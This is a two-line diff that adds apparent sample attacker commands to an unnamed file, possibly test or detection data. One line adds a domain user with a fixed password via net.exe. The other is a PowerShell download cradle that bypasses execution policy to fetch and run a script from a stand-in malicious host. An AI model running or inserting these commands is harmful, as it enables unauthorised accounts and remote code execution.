@@ -1,0 +1,2 @@
+net.exe user /add testuser testpass /domain
+powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
